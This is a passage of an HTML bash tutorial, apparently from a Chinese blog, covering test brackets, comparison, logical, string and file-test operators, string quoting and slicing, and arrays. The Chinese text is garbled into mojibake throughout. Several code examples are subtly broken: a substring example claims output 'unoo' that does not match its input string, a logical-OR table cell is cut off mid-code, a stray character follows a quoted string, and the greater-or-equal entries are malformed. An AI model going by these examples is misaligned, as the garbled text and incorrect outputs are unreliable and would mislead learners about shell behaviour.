<td>é€šè¿‡å•ä¸­æ‹¬å·è¿›è¡Œæ¡ä»¶æµ‹è¯•è¡¨è¾¾å¼ä¹¦å†™ï¼›å•ä¸­æ‹¬å·çš„è¾¹ç•Œå’Œå†…å®¹ä¹‹é—´è‡³å°‘æœ‰ä¸€ä¸ªç©ºæ ¼</td>
</tr>
<tr>
<td>02</td>
<td style="text-align:center">[[ &lt;æµ‹è¯•è¡¨è¾¾å¼&gt; ]]</td>
<td>é€šè¿‡åŒä¸­æ‹¬å·è¿›è¡Œæ¡ä»¶æµ‹è¯•è¡¨è¾¾å¼ä¹¦å†™ï¼›åŒä¸­æ‹¬å·çš„è¾¹ç•Œå’Œå†…å®¹ä¹‹é—´è‡³å°‘æœ‰ä¸€ä¸ªç©ºæ ¼</td>
</tr>
<tr>
<td>03</td>
<td style="text-align:center">((&lt;æµ‹è¯•è¡¨è¾¾å¼&gt;))</td>
<td>é€šè¿‡åŒå°æ‹¬å·è¿›è¡Œæ¡ä»¶æµ‹è¯•è¡¨è¾¾å¼ä¹¦å†™ï¼›åŒå°æ‹¬å·çš„è¾¹ç•Œå’Œå†…å®¹ä¹‹é—´æ— éœ€æœ‰ç©ºæ ¼</td>
</tr>
</tbody>
</table>
<p><font class="notice">æ³¨ï¼šæ³¨æ„è¡¨è¾¾å½¢å¼<code>[]</code>å’Œ<code>[[]]</code>ä¹‹é—´çš„ç©ºæ ¼ï¼Œå¦‚æœæ²¡æœ‰ç©ºæ ¼åˆ™ä¼šæŠ¥é”™ï¼Œ<code>[[s</code>ä¼šè¢«å½“åšå‘½ä»¤æ‰§è¡Œ</font></p>
<p>åœ¨æ¡ä»¶æµ‹è¯•åˆ¤æ–­æ—¶ï¼Œä¼šæ ¹æ®å¸ƒå°”ç±»å‹æ•°å€¼è¿›è¡Œåˆ¤æ–­æ¡ä»¶çœŸä¸å‡çš„å…³ç³»ï¼š</p>
<table>
<thead>
<tr>
<th><strong>æ¡ä»¶</strong></th>
<th><strong>æ•°å€¼è¡¨ç¤º</strong></th>
<th><strong>è¯´æ˜</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>True</td>
<td>1</td>
<td>è¡¨ç¤ºåˆ¤æ–­ç»“æœä¸ºçœŸï¼Œåˆ¤æ–­çš„æ¡ä»¶è¡¨è¾¾å¼æˆç«‹</td>
</tr>
<tr>
<td>False</td>
<td>0</td>
<td>è¡¨ç¤ºåˆ¤æ–­ç»“æœä¸ºå‡ï¼Œåˆ¤æ–­çš„æ¡ä»¶è¡¨è¾¾å¼ä¸æˆç«‹</td>
</tr>
</tbody>
</table>
<p>echo $? ï¼ˆç‰¹æ®Š 0è¡¨ç¤ºæˆåŠŸ å…¶ä»–è¡¨ç¤ºå¤±è´¥ï¼‰å¯ä»¥åˆ¤æ–­ä¸Šä¸€ä¸ªå‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œè„šæœ¬ã€å‘½ä»¤è¡Œéƒ½å¯ä»¥è¿›è¡Œé€»è¾‘åˆ¤æ–­ã€‚</p>
<p>æ ¹æ®expræ“ä½œå‘½ä»¤çš„è¿”å›å€¼è¿›è¡Œåˆ¤æ–­ï¼Œ$? è¿”å›å€¼ä¸º0è¡¨ç¤ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œé0è¡¨ç¤ºæ‰§è¡Œå¤±è´¥é”™è¯¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">expr</span> <span class="variable">$num1</span> + <span class="variable">$num2</span> + 1 &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ä½ è¾“å…¥çš„æ•°å­—æœ‰çš„ä¸æ˜¯æ•´æ•°ï¼Œè¯·é‡æ–°è¾“å…¥&quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="å…³ç³»è¿ç®—ç¬¦"><strong>å…³ç³»è¿ç®—ç¬¦</strong></h3>
<p>å…³ç³»è¿ç®—ç¬¦åªæ”¯æŒæ•°å­—ï¼Œä¸æ”¯æŒå­—ç¬¦ä¸²ï¼Œé™¤éå­—ç¬¦ä¸²çš„å€¼æ˜¯æ•°å­—ã€‚</p>
<p>åŒå°æ‹¬å· â€(())â€ çš„ä½œç”¨æ˜¯è¿›è¡Œæ•°å€¼è¿ç®—ä¸æ•°å€¼æ¯”è¾ƒï¼Œå®ƒçš„æ•ˆç‡å¾ˆé«˜ï¼Œç”¨æ³•çµæ´»ï¼Œæ˜¯ä¼ä¸šåœºæ™¯è¿ç»´äººå‘˜ç»å¸¸é‡‡ç”¨çš„è¿ç®—æ“ä½œç¬¦ï¼›</p>
<p>ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨çš„å…³ç³»è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º 10ï¼Œå˜é‡ b ä¸º 20ï¼š</p>
<table>
<thead>
<tr>
<th>è¿ç®—ç¬¦ï¼ˆ<code>[]</code>ä¸­ï¼‰</th>
<th>è¿ç®—ç¬¦ï¼ˆ<code>[[]]</code>ã€<code>(())</code>ä¸­ï¼‰</th>
<th>è¯´æ˜</th>
<th>ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>-eq</td>
<td>==</td>
<td>ç›¸ç­‰</td>
<td><code>[ $a -eq $b ]</code> è¿”å› falseã€‚</td>
</tr>
<tr>
<td>-ne</td>
<td>!=</td>
<td>ä¸ç›¸ç­‰</td>
<td><code>[ $a -ne $b ]</code> è¿”å› trueã€‚</td>
</tr>
<tr>
<td>-gt</td>
<td>&gt;</td>
<td>å¤§äº</td>
<td><code>[ $a -gt $b ]</code> è¿”å› falseã€‚</td>
</tr>
<tr>
<td>-lt</td>
<td>&lt;</td>
<td>å°äº</td>
<td><code>[ $a -lt $b ]</code> è¿”å› trueã€‚</td>
</tr>
<tr>
<td>-ge</td>
<td>$a&gt;$b || $a=$b</td>
<td>å¤§äºç­‰äº</td>
<td><code>[ $a -ge $b ]</code>è¿”å› falseã€‚</td>
</tr>
<tr>
<td>-le</td>
<td>$a&lt;$b || $a=$b</td>
<td>å°äºç­‰äº</td>
<td><code>[ $a -le $b ]</code> è¿”å› trueã€‚</td>
</tr>
</tbody>
</table>
<p>â€œ=â€ å’Œ â€œ!=â€ ä¹Ÿå¯åœ¨<code>[]</code>ä¸­åšæ¯”è¾ƒä½¿ç”¨ï¼Œä½†åœ¨<code>[]</code>ä¸­ä½¿ç”¨åŒ…å«â€œ&gt;â€å’Œâ€œ&lt;â€çš„ç¬¦å·æ—¶ï¼Œéœ€è¦ç”¨åæ–œçº¿è½¬ä¹‰</p>
<p>ä¹Ÿå¯ä»¥åœ¨<code>[[]]</code>ä¸­ä½¿ç”¨åŒ…å« â€-gtâ€ å’Œ â€-ltâ€ çš„ç¬¦å· æ¯”è¾ƒç¬¦å·ä¸¤ç«¯ä¹Ÿè¦æœ‰ç©ºæ ¼</p>
<h3 id="é€»è¾‘æ“ä½œç¬¦"><strong>é€»è¾‘æ“ä½œç¬¦</strong></h3>
<p>ä»¥ä¸‹ä»‹ç» Shell çš„é€»è¾‘è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º 10ï¼Œå˜é‡ b ä¸º 20:</p>
<table>
<thead>
<tr>
<th><code>[]</code>è¿ç®—ç¬¦</th>
<th><code>[[]]</code>è¿ç®—ç¬¦</th>
<th>è¯´æ˜</th>
<th>ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>&amp;&amp;</td>
<td>é€»è¾‘çš„ AND</td>
<td><code>[[ $a -lt 100 &amp;&amp; $b -gt 100 ]]</code> è¿”å› false</td>
</tr>
<tr>
<td>-o</td>
<td>||</td>
<td>é€»è¾‘çš„ OR</td>
<td>`[[ $a -lt 100</td>
</tr>
<tr>
<td>!</td>
<td>!</td>
<td>é€»è¾‘çš„NOT</td>
<td><code>[[ ! $a -lt 100 ]]</code> è¿”å›false</td>
</tr>
</tbody>
</table>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ æ¡ä»¶1 ] -a [ æ¡ä»¶2 ]</span><br><span class="line">[[ æ¡ä»¶1 ]] &amp;&amp; [[ æ¡ä»¶2 ]]</span><br><span class="line">((æ¡ä»¶<span class="number">1</span>)) &amp;&amp; ((æ¡ä»¶<span class="number">2</span>))</span><br><span class="line">[ ! æ¡ä»¶ ] </span><br></pre></td></tr></table></figure>
<h3 id="å­—ç¬¦ä¸²è¿ç®—ç¬¦">å­—ç¬¦ä¸²è¿ç®—ç¬¦</h3>
<p>ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨çš„å­—ç¬¦ä¸²è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º â€œabcâ€ï¼Œå˜é‡ b ä¸º â€œefgâ€ï¼š</p>
<table>
<thead>
<tr>
<th>è¿ç®—ç¬¦</th>
<th>è¯´æ˜</th>
<th>ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>=</td>
<td>æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å› trueã€‚</td>
<td><code>[ $a = $b ]</code> è¿”å› falseã€‚</td>
</tr>
<tr>
<td>!=</td>
<td>æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å› trueã€‚</td>
<td><code>[ $a != $b ]</code> è¿”å› trueã€‚</td>
</tr>
<tr>
<td>-z</td>
<td>æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0ï¼Œä¸º0è¿”å› trueã€‚</td>
<td><code>[ -z $a ]</code> è¿”å› falseã€‚</td>
</tr>
<tr>
<td>-n</td>
<td>æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0ï¼Œä¸ä¸º0è¿”å› trueã€‚</td>
<td><code>[ -n &quot;$a&quot; ]</code> è¿”å› trueã€‚</td>
</tr>
<tr>
<td>$</td>
<td>æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºè¿”å› trueã€‚</td>
<td><code>[ $a ]</code> è¿”å› trueã€‚</td>
</tr>
<tr>
<td>&gt;</td>
<td>åˆ¤æ–­å­—ç¬¦ç›¸åŒé¡ºä½çš„å­—ç¬¦å¤§å°ï¼Œå¸¸ä½¿ç”¨<code>[[]]</code></td>
<td><code>[[ $a &gt; $b ]]</code>è¿”å›false</td>
</tr>
<tr>
<td>&lt;</td>
<td>åˆ¤æ–­å­—ç¬¦ç›¸åŒé¡ºä½çš„å­—ç¬¦å¤§å°ï¼Œå¸¸ä½¿ç”¨<code>[[]]</code></td>
<td><code>[[ $a &lt; $b ]]</code>è¿”å›true</td>
</tr>
<tr>
<td>=~</td>
<td>åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼é€šï¼Œå¸¸ä½¿ç”¨<code>[[]]</code></td>
<td><code>[[ $a =~ \b[a-z]*\b ]]</code>è¿”å›true</td>
</tr>
</tbody>
</table>
<h3 id="æ–‡ä»¶æ£€æµ‹è¿ç®—ç¬¦">æ–‡ä»¶æ£€æµ‹è¿ç®—ç¬¦</h3>
<p>æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦ç”¨äºæ£€æµ‹ Unix æ–‡ä»¶çš„å„ç§å±æ€§ã€‚</p>
<p>å±æ€§æ£€æµ‹æè¿°å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>æ“ä½œç¬¦</th>
<th>è¯´æ˜</th>
<th>ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>-f file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯æ™®é€šæ–‡ä»¶ï¼ˆæ—¢ä¸æ˜¯ç›®å½•ï¼Œä¹Ÿä¸æ˜¯è®¾å¤‡æ–‡ä»¶ï¼‰</td>
<td>[ -f $file ]</td>
</tr>
<tr>
<td>-d file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯ç›®å½•</td>
<td>[ -d $file ]</td>
</tr>
<tr>
<td>-e file</td>
<td>æ£€æµ‹æ–‡ä»¶ï¼ˆåŒ…æ‹¬ç›®å½•ï¼‰æ˜¯å¦å­˜åœ¨</td>
<td>[ -e $file ]</td>
</tr>
<tr>
<td>-b file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å—è®¾å¤‡æ–‡ä»¶</td>
<td>[ -b $file ]</td>
</tr>
<tr>
<td>-c file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å­—ç¬¦è®¾å¤‡æ–‡ä»¶</td>
<td>[ -c $file ]</td>
</tr>
<tr>
<td>-g file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SGID ä½</td>
<td>[ -g $file ]</td>
</tr>
<tr>
<td>-k file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº†ç²˜ç€ä½(Sticky Bit)</td>
<td>[ -k $file ]</td>
</tr>
<tr>
<td>-u file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SUID ä½</td>
<td>[ -u $file ]</td>
</tr>
<tr>
<td>-r file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯è¯»</td>
<td>[ -r $file ]</td>
</tr>
<tr>
<td>-w file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯å†™</td>
<td>[ -w $file ]</td>
</tr>
<tr>
<td>-x file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ</td>
<td>[ -x $file ]</td>
</tr>
<tr>
<td>-p file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯æœ‰åç®¡é“</td>
<td>[ -p $file ]</td>
</tr>
<tr>
<td>-s file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸ä¸ºç©ºï¼ˆæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äº0ï¼‰</td>
<td>[ -s $file ]</td>
</tr>
<tr>
<td>-S file</td>
<td>åˆ¤æ–­æŸæ–‡ä»¶æ˜¯å¦ socketã€‚</td>
<td>[ -S $file ]</td>
</tr>
<tr>
<td>-L file</td>
<td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¹¶ä¸”æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ã€‚</td>
<td>[ -L $file ]</td>
</tr>
</tbody>
</table>
<h2 id="shellæ•°æ®ç±»å‹">shellæ•°æ®ç±»å‹</h2>
<h3 id="å­—ç¬¦ä¸²">å­—ç¬¦ä¸²</h3>
<p>å­—ç¬¦ä¸²å¯ä»¥ç”¨å•å¼•å·ï¼Œä¹Ÿå¯ä»¥ç”¨åŒå¼•å·ï¼Œä¹Ÿå¯ä»¥ä¸ç”¨å¼•å·ã€‚</p>
<p>å•å¼•å·ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&#x27;this is a string&#x27;</span>b</span><br></pre></td></tr></table></figure>
<p>å•å¼•å·å­—ç¬¦ä¸²çš„é™åˆ¶ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å•å¼•å·é‡Œçš„ä»»ä½•å­—ç¬¦éƒ½ä¼šåŸæ ·è¾“å‡ºï¼Œå•å¼•å·å­—ç¬¦ä¸²ä¸­çš„å˜é‡æ˜¯æ— æ•ˆçš„ï¼›</p>
</li>
<li class="lvl-2">
<p>å•å¼•å·å­—ä¸²ä¸­ä¸èƒ½å‡ºç°å•ç‹¬ä¸€ä¸ªçš„å•å¼•å·ï¼ˆå¯¹å•å¼•å·ä½¿ç”¨è½¬ä¹‰ç¬¦åä¹Ÿä¸è¡Œï¼‰ï¼Œä½†å¯æˆå¯¹å‡ºç°ï¼Œä½œä¸ºå­—ç¬¦ä¸²æ‹¼æ¥ä½¿ç”¨ã€‚</p>
</li>
</ul>
<p>åŒå¼•å·ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&#x27;taobao&#x27;</span></span><br><span class="line">str=<span class="string">&quot;Hello, I know you are \&quot;<span class="variable">$your_name</span>\&quot;! \n&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="variable">$str</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœä¸ºï¼š</span></span><br><span class="line">Hello, I know you are <span class="string">&quot;taobao&quot;</span>! </span><br></pre></td></tr></table></figure>
<p>åŒå¼•å·çš„ä¼˜ç‚¹ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åŒå¼•å·é‡Œå¯ä»¥æœ‰å˜é‡</p>
</li>
<li class="lvl-2">
<p>åŒå¼•å·é‡Œå¯ä»¥å‡ºç°è½¬ä¹‰å­—ç¬¦</p>
</li>
</ul>
<p>æ‹¼æ¥å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;taobao&quot;</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨åŒå¼•å·æ‹¼æ¥</span></span><br><span class="line">greeting=<span class="string">&quot;hello, &quot;</span><span class="variable">$your_name</span><span class="string">&quot; !&quot;</span>     <span class="comment">#åŒå¼•å·å¤–å¯ä»¥ä¸åŠ &quot;&#123;&#125;&quot;</span></span><br><span class="line">greeting_1=<span class="string">&quot;hello, <span class="variable">$&#123;your_name&#125;</span> !&quot;</span>   <span class="comment">#åŒå¼•å·å†…åŠ &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting</span>  <span class="variable">$greeting_1</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨å•å¼•å·æ‹¼æ¥</span></span><br><span class="line">greeting_2=<span class="string">&#x27;hello, &#x27;</span><span class="variable">$your_name</span><span class="string">&#x27; !&#x27;</span></span><br><span class="line">greeting_3=<span class="string">&#x27;hello, $&#123;your_name&#125; !&#x27;</span>   <span class="comment">#å•å¼•å·å†…åŸæ¥æ˜¯å•¥å°±æ˜¯å•¥</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting_2</span>  <span class="variable">$greeting_3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœä¸ºï¼š</span></span><br><span class="line">hello, taobao ! hello, taobao !</span><br><span class="line">hello, taobao ! hello, <span class="variable">$&#123;your_name&#125;</span> !</span><br></pre></td></tr></table></figure>
<p><strong>è·å–å­—ç¬¦ä¸²é•¿åº¦<code>$&#123;#s&#125;</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span> <span class="comment">#è¾“å‡º 4</span></span><br></pre></td></tr></table></figure>
<p><strong>æˆªå–å­—ç¬¦ä¸²${s:n1:n2}</strong></p>
<p>ä»¥ä¸‹å®ä¾‹ä»å­—ç¬¦ä¸²ç¬¬ <strong>2</strong> ä¸ªå­—ç¬¦å¼€å§‹æˆªå– <strong>4</strong> ä¸ªå­—ç¬¦ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;taobao is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;string:1:4&#125;</span> <span class="comment"># è¾“å‡º unoo</span></span><br></pre></td></tr></table></figure>
<p><strong>æŸ¥æ‰¾å­—ç¬¦å‡ºç°çš„ä½ç½®<code>expr index</code></strong></p>
<p>æŸ¥æ‰¾å­—ç¬¦ <strong>i</strong> æˆ– <strong>o</strong> çš„ä½ç½®(å“ªä¸ªå­—æ¯å…ˆå‡ºç°å°±è®¡ç®—å“ªä¸ª)ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;taobao is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> index <span class="string">&quot;<span class="variable">$string</span>&quot;</span> io`  <span class="comment"># è¾“å‡º 3</span></span><br></pre></td></tr></table></figure>
<p><strong>æ³¨æ„ï¼š</strong> ä»¥ä¸Šè„šæœ¬ä¸­ <strong>`</strong> æ˜¯åå¼•å·ï¼Œè€Œä¸æ˜¯å•å¼•å· <strong>'</strong>ã€‚</p>
<h3 id="æ•°ç»„">æ•°ç»„</h3>
<p>bashæ”¯æŒä¸€ç»´æ•°ç»„ï¼ˆä¸æ”¯æŒå¤šç»´æ•°ç»„ï¼‰ï¼Œå¹¶ä¸”æ²¡æœ‰é™å®šæ•°ç»„çš„å¤§å°ã€‚</p>
<p>æ•°ç»„å…ƒç´ çš„ä¸‹æ ‡ç”± 0 å¼€å§‹ç¼–å·ã€‚</p>
<h4 id="å®šä¹‰æ•°ç»„">å®šä¹‰æ•°ç»„</h4>
<p>åœ¨ Shell ä¸­ï¼Œç”¨æ‹¬å·æ¥è¡¨ç¤ºæ•°ç»„ï¼Œæ•°ç»„å…ƒç´ ç”¨&quot;ç©ºæ ¼&quot;ç¬¦å·åˆ†å‰²å¼€ã€‚å¯ä»¥ä¸ä½¿ç”¨è¿ç»­çš„ä¸‹æ ‡ï¼Œè€Œä¸”ä¸‹æ ‡çš„èŒƒå›´æ²¡æœ‰é™åˆ¶ã€‚</p>
<p>æ•°ç»„çš„å®šä¹‰æ–¹æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å®šä¹‰æ•°ç»„çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š</span></span><br><span class="line">array_name=(value0 value1 value2 value3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–è€…</span></span><br><span class="line">array_name=(</span><br><span class="line">value0</span><br><span class="line">value1</span><br><span class="line">value2</span><br><span class="line">value3</span><br><span class="line">)</span><br><span class="line"><span class="comment">#é‡‡ç”¨é”®å€¼å¯¹çš„å½¢å¼èµ‹å€¼ï¼ˆäº†è§£å³å¯ï¼‰</span></span><br><span class="line">array=([1]=one [2]=two [3]=three)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–å•ç‹¬å®šä¹‰æ•°ç»„çš„å„ä¸ªåˆ†é‡ï¼ˆéº»çƒ¦ï¼Œä¸æ¨èï¼‰</span></span><br><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[n]=valuen</span><br></pre></td></tr></table></figure>
<h4 id="è¯»å–æ•°ç»„">è¯»å–æ•°ç»„</h4>
<p>è¯»å–æ•°ç»„å…ƒç´ å€¼çš„ä¸€èˆ¬æ ¼å¼æ˜¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">valuen=<span class="variable">$&#123;array_name[n]&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">my_array=(A B <span class="string">&quot;C&quot;</span> D)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º: <span class="variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬äºŒä¸ªå…ƒç´ ä¸º: <span class="variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸‰ä¸ªå…ƒç´ ä¸º: <span class="variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬å››ä¸ªå…ƒç´ ä¸º: <span class="variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œè„šæœ¬ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</span></span><br><span class="line">ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º: A</span><br><span class="line">ç¬¬äºŒä¸ªå…ƒç´ ä¸º: B</span><br><span class="line">ç¬¬ä¸‰ä¸ªå…ƒç´ ä¸º: C</span><br><span class="line">ç¬¬å››ä¸ªå…ƒç´ ä¸º: D</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ <code>@</code>æˆ–<code>*</code> ç¬¦å·å¯ä»¥è·å–æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array_name[@]&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">my_array=(A B C D)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ•°ç»„çš„å…ƒç´ ä¸º: <span class="variable">$&#123;my_array[*]&#125;</span>&quot;</span></span><br><span class="line">my_array[4]=E</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ•°ç»„çš„å…ƒç´ ä¸º: <span class="variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œè„šæœ¬ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</span></span><br><span class="line">æ•°ç»„çš„å…ƒç´ ä¸º: A B C D</span><br><span class="line">æ•°ç»„çš„å…ƒç´ ä¸º: A B C D E</span><br></pre></td></tr></table></figure>
<h4 id="è·å–æ•°ç»„çš„é•¿åº¦">è·å–æ•°ç»„çš„é•¿åº¦</h4>
<p>è·å–æ•°ç»„é•¿åº¦çš„æ–¹æ³•ä¸è·å–å­—ç¬¦ä¸²é•¿åº¦çš„æ–¹æ³•ç›¸åŒï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å–å¾—æ•°ç»„å…ƒç´ çš„ä¸ªæ•°</span></span><br><span class="line">length=<span class="variable">$&#123;#array_name[@]&#125;</span></span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">length=<span class="variable">$&#123;#array_name[*]&#125;</span></span><br><span class="line"><span class="comment"># å–å¾—æ•°ç»„å•ä¸ªå…ƒç´ çš„é•¿åº¦</span></span><br><span class="line">lengthn=<span class="variable">$&#123;#array_name[n]&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">my_array=(A B C D)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º: <span class="variable">$&#123;#my_array[*]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º: <span class="variable">$&#123;#my_array[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œè„šæœ¬ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</span></span><br><span class="line">æ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º: 4</span><br><span class="line">æ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º: 4</span><br></pre></td></tr></table></figure>
<h4 id="æ•°ç»„å…ƒç´ ä¿¡æ¯åˆ é™¤">æ•°ç»„å…ƒç´ ä¿¡æ¯åˆ é™¤</h4>
<p>ä½¿ç”¨unsetå‘½ä»¤åˆ é™¤æ•°ç»„ä¿¡æ¯ï¼š</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[<span class="number">17</span>:<span class="number">38</span>:<span class="number">49</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># my_array=(A B C D)</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">53</span>:<span class="number">00</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># echo $&#123;my_array[*]&#125;</span></span><br><span class="line">A B C D</span><br><span class="line">[<span class="number">17</span>:<span class="number">54</span>:<span class="number">25</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># unset my_array[3]</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">55</span>:<span class="number">01</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># echo $&#123;my_array[*]&#125;</span></span><br><span class="line">A B C</span><br><span class="line">[<span class="number">17</span>:<span class="number">55</span>:<span class="number">27</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># unset my_array </span></span><br><span class="line">[<span class="number">17</span>:<span class="number">55</span>:<span class="number">33</span> root<span class="symbol">@centon7</span> ~]<span class="meta"># echo $&#123;my_array[*]&#125;  #è¾“å‡ºä¸ºç©º</span></span><br></pre></td></tr></table></figure>
<h2 id="ShellåŸºç¡€æ“ä½œ">ShellåŸºç¡€æ“ä½œ</h2>
